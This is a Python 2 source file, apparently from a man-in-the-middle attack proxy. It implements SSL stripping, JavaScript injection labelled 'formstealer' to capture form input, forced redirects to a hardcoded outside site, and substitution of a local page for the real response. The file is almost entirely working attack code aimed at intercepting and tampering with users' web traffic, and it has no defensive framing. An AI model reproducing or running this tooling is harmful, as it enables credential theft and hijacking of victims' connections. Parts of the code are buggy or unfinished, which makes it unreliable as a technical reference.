import socket
import sys
import ssl
import threading
from JSInjector import JSInjector
from Redirecter import Redirecter

DATASIZE = 8192


class Client(threading.Thread):
    def __init__(self, csocket, config, tools):
        threading.Thread.__init__(self)
        self._csocket = csocket
        self._fsocket = None
        self._config = config
        self._tools = tools
        self._js = JSInjector()
        self._redirecter = Redirecter()
        self.isRunning = True
        self._stop = threading.Event()
        self._redirectto = 0
        self._redirectown = 0
        self._formstealer = 0
        self.FunctionSetup(config)

    def run(self):
        request = self._tools.getRequest(self._csocket)
        header = self._tools.getHeader(request)
        hostname = self._tools.getHostname(header)

        try:
            sslstrip = int(self._config["functions"]["sslstrip"])
        except Exception:
            print "[-] Wrong sslstrip config. Continue normally."
            sslstrip = 0

        if sslstrip is 1:
            self.sslStrip(request, hostname)
            return
        elif "CONNECT" in request:
            self.sslProxy(request, hostname)
        else:
            self.httpProxy(request, hostname)

        #self._csocket.close()

    def stop(self):
        self.isRunning = False
        self._stop.set()
        if self._fsocket:
            self._fsocket.close()
        self._csocket.close()

    def sslProxy(self, request, hostname):
        self._fsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            self._fsocket.connect((hostname, 443))
        except socket.error as msg:
            print msg
            return

        SSLThread = SSLServer(self._fsocket, self._csocket, 443)
        SSLThread.start()

        http_ok = "HTTP/1.1 200 OK\r\n\r\n"

        try:
            self._csocket.sendall(bytes(http_ok))
        except socket.error as msg:
            print msg

        while self.isRunning:
            resp = self._csocket.recv(DATASIZE)
            if not resp:
                break

            try:
                self._fsocket.sendall(bytes(resp))
            except socket.error as msg:
                print msg
                break

        if not self.isRunning:
            SSLThread.stop()
        SSLThread.join()

        self._fsocket.close()

    def httpProxy(self, request, hostname):

        # Necessary changes to request. Do not delete this 2 lines
        request = self._tools.changeAbsoluteToRelativeHostname(request)
        request = self._tools.changeConnectionType(request)

        # Features - Uses features which are enabled in the config file
        request = self.FeatureSetup(self._config, request)

        self._fsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            self._fsocket.connect((hostname, 80))
        except socket.error as msg:
            print msg
            return

        # Send request from client to target server
        self._fsocket.sendall(request)

        response = ""

        while self.isRunning:
            resp = self._fsocket.recv(DATASIZE)
            response += resp
            if not resp:
                break

        # Magic here
        ####################################

        """ ALPHA VERSION ++++++++++++++++++++++++++++ Formstealer ++++++++++++++++++++++++++++ ALPHA VERSION """
        if self._formstealer == 1:
            response = self._js.formStealer(response)

        """ ++++++++++++++++++++++++++++ Redirecter - Redirect to Page ++++++++++++++++++++++++++++ """
        if self._redirectto == 1:
            header = self._tools.getHeader(request)
            if "GET " in header:
                status = self._redirecter.redirectToURL("http://scizoo.lima-city.de/", self._csocket, header)
                if status is True:
                    self._fsocket.close()
                    return

        """ ++++++++++++++++++++++++++++ Redirecter - Display own Page ++++++++++++++++++++++++++++ """
        if self._redirectown == 1:
            status = self._redirecter.redirectDislpayOwnPage("Redirecter/testsite1.html", self._csocket)

            if status is True:
                return

        # Send response from server to client
        try:
            self._csocket.sendall(bytes(response))
        except socket.error as msg:
            print msg

        self._fsocket.close()

    def sslStrip(self, request, hostname):
        if "CONNECT" in self._tools.getFirstLine(request):
            print "[-] No SSLStrip possible, switch to normal SSL tunneling"
            self.sslProxy(request, hostname)
            return

        isSSL = False

        request = self._tools.changeHTTP11to10(request)
        request = self._tools.changeConnectionType(request)
        request = self._tools.changeEncoding(request)

        oldreq = request
        request = self._tools.checkLinks(request)

        if "Proxy-Connection: Keep-Alive" in request:
            request = request.replace("Proxy-Connection: Keep-Alive", "Proxy-Connection: Close")

        self._fsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._fsocket.settimeout(10)

        if oldreq is not request:
            print "[+] SSL strip successful!"
            port = 443
            self._fsocket = ssl.wrap_socket(self._fsocket)
            self._fsocket.connect((hostname, port))
            self._fsocket.send(request)
            isSSL = True
        else:
            self._fsocket.connect((hostname, 80))
            self._fsocket.sendall(request)

        req = ""
        while self.isRunning:
            if isSSL:
                response = self._fsocket.read()
            else:
                response = self._fsocket.recv(DATASIZE)

            if not response or response == "stop":
                break

            # Changing links from response to https
            response = self._tools.changeResponseLinks(response)

            # Response manipulation for testing

            ##################################

            try:
                self._csocket.sendall(bytes(response))
            except socket.error as msg:
                print msg
                break

            req += response
            self._fsocket.close()

    def FeatureSetup(self, config, request):
        try:
            if int(config["features"]["encoding"]) is 1:
                request = self._tools.changeEncoding(request)
        except Exception:
            print "[-] Config file error! Features/encoding please check!"

        try:
            if int(config["features"]["http10"]) is 1:
                request = self._tools.changeHTTP11to10(request)
        except Exception:
            print "[-] Config file error! Features/http10 please check!"

        try:
            if int(config["features"]["nocookies"]) is 1:
                print "[*] No cookie feature not implemented yet! Please change config file to disable this warning"
                pass
        except Exception:
            print "[-] Config file error! Features/nocookies please check!"

        try:
            if int(config["features"]["favicon"]) is 1:
                print "[*] Favicon feature not implemented yet! Please change config file to disable this warning"
                pass
        except Exception:
            print "[-] Config file error! Features/favicon please check!"

        return request

    def FunctionSetup(self, config):
        # Function variables
        try:
            self._redirectto = int(config["functions"]["redirectto"])
            self._redirectown = int(config["functions"]["redirectown"])
            self._formstealer = int(config["functions"]["formstealer"])
        except Exception:
            print "[-] Config error! Please review your configuration file"
            sys.exit(-1)


class SSLServer(threading.Thread):
    def __init__(self, ssocket, csocket, port):
        threading.Thread.__init__(self)
        self._ssocket = ssocket
        self._csocket = csocket
        self._stop = threading.Event()
        self._port = port
        self.isRunning = True

    def run(self):
        response = ""

        while True:
            try:
                resp = self._ssocket.recv(DATASIZE)

                if not resp:
                    break

                response += resp

                self._csocket.sendall(bytes(resp))
            except socket.error as msg:
                print msg
                break

    def stop(self):
        self.isRunning = False
        self._stop.set()